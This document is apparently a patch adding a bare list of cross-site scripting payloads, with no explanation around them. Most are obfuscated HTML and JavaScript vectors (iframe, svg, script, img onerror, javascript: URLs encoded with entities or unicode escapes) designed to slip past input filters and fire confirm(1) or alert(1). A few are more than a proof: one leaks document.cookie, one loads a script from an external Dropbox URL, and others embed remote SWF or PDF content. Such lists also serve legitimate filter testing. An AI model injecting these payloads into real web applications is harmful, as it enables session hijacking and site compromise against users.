+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=confirm(1) /*iframe/src*/>
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+<a/href="javascript:&#13; javascript:confirm(1)"><input type="X">
+</plaintext\></|\><plaintext/onmouseover=confirm(1)
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>confirm&#x28;1&#x29; {Opera}
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<div onmouseover='confirm&lpar;1&rpar;'>DIV</div>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="confirm(1)">
+<a href="jAvAsCrIpT&colon;confirm&lpar;1&rpar;">X</a>
+<embed
+src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<object
+data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<var onmouseover="confirm(1)">On Mouse Over</var>
+<a href=javascript&colon;confirm&lpar;document&period;cookie&rpar;>Click Here</a>
+<img src="/" =_=" title="onerror='confirm(1)'">
+<%<!--'%><script>confirm(1);</script -->
+<script src="data:text/javascript,confirm(1)"></script>
+<iframe/src \/\/onload = confirm(1)
+<iframe/onreadystatechange=confirm(1)
+<svg/onload=confirm(1)
+<input value=<><iframe/src=javascript:confirm(1)
+<input type="text" value=`` <div/onmouseover='confirm(1)'>X</div>
+http://www.<script>confirm(1)</script .com
+<iframe
+src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;
+&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Ta
+b;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&T
+ab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;
+&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&
+Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;
+&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Ta
+b;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&
+Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;
+&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&T
+ab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;
+&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+<svg><script ?>confirm(1)
+<iframe
+src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Ta
+b;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<img src=`xx:xx`onerror=confirm(1)>
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<meta http-equiv="refresh" content="0;javascript&colon;confirm(1)"/>
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.
+\u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 &
+/=%2F
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65
+%72%74(/XSS/)></script
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<script>+-+-1-+-+confirm(1)</script>
+<body/onload=&lt;!--&gt;&#10confirm(1)>
+<script itworksinallbrowsers>/*<script* */confirm(1)</script
+<img src ?itworksonchrome?\/onerror = confirm(1)
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> confirm(1)
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa
+href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<script x> confirm(1) </script 1=2
+<div/onmouseover='confirm(1)'> style="x:">
+<--`<img/src=` onerror=confirm(1)> --!>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x00
+0070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="confirm(1)"
+onclick="confirm(1)">x</button>
+"><img src=x onerror=window.open('https://www.google.com/');>
+<form><button formaction=javascript&colon;confirm(1)>CLICKME
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%7
+3%63%72%69%70%74%3E"></iframe>
